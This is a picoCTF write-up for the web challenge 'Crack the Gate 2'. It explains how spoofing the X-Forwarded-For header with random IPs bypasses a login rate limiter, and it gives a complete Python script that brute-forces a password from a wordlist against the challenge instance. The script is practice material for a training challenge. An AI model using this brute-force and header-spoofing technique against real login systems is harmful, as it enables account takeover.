---
title: "Crack the Gate 2"
date: 2025-10-22
categories:
  - picoCTF
tags:
  - web
---

## Description

The login system has been upgraded with a basic rate-limiting mechanism that locks out repeated failed attempts from the same source. We’ve received a tip that the system might still trust user-controlled headers. Your objective is to bypass the rate-limiting restriction and log in using the known email address: ctf-player@picoctf.org and uncover the hidden secret.
Additional details will be available after launching your challenge instance.

### Hint
 - You can rotate fake IPs to bypass rate limits.
 - Read more about X-forwarded-For
 - You can rotate fake IPs to bypass rate limits.

### Solution
First run the instance and install password list and enter the email given <b>ctf-player@picoctf.org</b> and random password we got Invalid credentials in first request but in second we got ratelimit
Now after searching about the role of X-forwarded-For : used to identify the originating IP address of a client connecting to a web server through a proxy or load balance.
Try to send another request in burp using this header X-forwarded-For and a random ipv4 now request was send correctly
here a code in python that will help in this 
```
import requests
import random
url = "" # Enter your instance url
def random_ipv4():
    return "{}.{}.{}.{}".format( random.randint(1, 254), random.randint(1, 254), random.randint(1, 254), random.randint(1, 254),)
def Login(PassW , Ip):
    headers = {
        'Accept-Language': 'fr-FR,fr;q=0.9',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
        'Content-Type': 'application/json',
        'Accept': '*/*',
        'Connection': 'keep-alive',
        'X-Forwarded-For': Ip,
    }

    json_data = { 'email': 'ctf-player@picoctf.org', 'password': PassW,}

    response = requests.post(url, headers=headers, json=json_data, verify=False)
    if 'success' in response.text:
        success = response.json().get('success')
        if success:
            if 'flag' in response.text:
                flag = response.json().get('flag')
                print(f"[+] Flag found for IP {Ip}: {flag}")
            else:
                print(response.text)
    else:
        print(f"[-] RateLimited or failed attempt for IP {Ip}")
        
passes = open("pass.txt", "r").read().splitlines()
for password in passes:
    password = password.strip()
    ip_address = random_ipv4()
    Login(password, ip_address)
```


This script will randomly generate ipv4 and read passwords from the wordlist given and will give you flag
There we go, we found our flag! 🥳

<img width="868" height="41" alt="image" src="https://github.com/user-attachments/assets/4155a37c-a1e8-4e66-bc5b-e3d4d76a9123" />

Happy hacking!
